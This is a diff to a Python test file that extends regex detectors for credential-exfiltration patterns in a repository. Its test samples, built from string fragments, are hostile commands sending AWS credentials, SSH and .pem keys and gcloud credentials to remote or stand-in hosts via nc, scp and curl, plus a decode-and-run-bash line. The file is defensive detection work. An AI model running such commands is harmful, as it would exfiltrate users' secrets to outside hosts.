@@ -335,15 +335,29 @@ def test_no_lookalike_domains_in_tracked_files():
 # example reports. A census of the tree when this was written: seven files name
 # a credential path, and NONE pairs one with a network sink on the same logical
 # line; `base64 -d | sh`, `/dev/tcp/` and `nc -e` appear zero times anywhere.
+#
+# `.pem` and `credentials.json` are named because a deploy key and a cloud
+# SDK's credential file are credentials by any reading, and `.env` is NOT:
+# writing a fetched token into a `.env` is an ordinary thing for CI prose to
+# describe, so that one alternative would fire on a plausible future catalog
+# entry and get this rule deleted. Bounded beats broad — the same trade the
+# installer arms above make.
 _CRED_PATH = (
     r"(?:\.aws/credentials|\.ssh/id_(?:rsa|ed25519|ecdsa|dsa)|\.netrc"
-    r"|gh/hosts\.yml|\.kube/config|\.docker/config\.json|\.git-credentials)"
+    r"|gh/hosts\.yml|\.kube/config|\.docker/config\.json|\.git-credentials"
+    r"|[\w.-]+\.pem\b|credentials\.json)"
 )
 
 # Egress, as a COMMAND or a literal address — not as prose. The probe script's
 # own docstring says a fixture "posts them to a remote endpoint", and that must
 # keep reading as English rather than as an exfiltration sink.
-_NET_SINK = r"(?:\bcurl\b|\bwget\b|\bnetcat\b|/dev/tcp/|https?://[\w-])"
+#
+# `nc` and `scp` are here because the opening pass named only `netcat`, the
+# spelling almost nobody types, and assumed egress meant HTTP. `scp` moves a
+# private key off the machine with no URL anywhere in the line.
+_NET_SINK = (
+    r"(?:\bcurl\b|\bwget\b|\bnetcat\b|\bnc\b|\bscp\b|/dev/tcp/|https?://[\w-])"
+)
 
 _EXFILTRATION = re.compile(
     rf"{_CRED_PATH}[^\n]{{0,160}}?{_NET_SINK}|{_NET_SINK}[^\n]{{0,160}}?{_CRED_PATH}",
@@ -389,6 +403,23 @@ def test_malicious_shape_detectors_fire_on_constructed_samples():
     assert _EXFILTRATION.search(ssh_key), "lost the sink-before-path ordering"
     gh_token = _parts("wget --post-file=$HOME/.config/", "gh/hosts.yml ", scheme, "x.example.invalid")
     assert _EXFILTRATION.search(gh_token), "lost the gh-credential form"
+
+    # The sinks and credential names an attacker reaches for first, none of
+    # which the opening pass recognised. `nc` is the alias everyone types
+    # (`netcat` is the one almost nobody does), `scp` moves a key without any
+    # HTTP at all, and a `.pem` deploy key or a cloud SDK's
+    # `credentials.json` is a credential by any reading. A census of all 377
+    # tracked text files found ZERO occurrences of any of these four paired
+    # with the other half, so none of them costs a false positive.
+    nc_alias = _parts("cat ~/", ".aws/credentials | nc ", "10.0.0.1 4444")
+    assert _EXFILTRATION.search(nc_alias), "lost the nc-alias sink"
+    scp_key = _parts("scp ~/", ".ssh/id_ed25519 ", "user@203.0.113.9:/tmp/k")
+    assert _EXFILTRATION.search(scp_key), "lost the scp sink"
+    pem_key = _parts("curl -T ~/", ".ssh/deploy-key.pem ", scheme, "drop.example.invalid")
+    assert _EXFILTRATION.search(pem_key), "lost the PEM private-key path"
+    sdk_creds = _parts(
+        "cat ~/.config/gcloud/", "credentials.json | curl -d @- ", scheme, "x.example.invalid")
+    assert _EXFILTRATION.search(sdk_creds), "lost the cloud-SDK credential file"
 
     decoded = _parts("echo aGVsbG8= | base64 ", "--decode | bash")
     assert _OBFUSCATED_EXEC.search(decoded), "lost the decode-then-run shape"
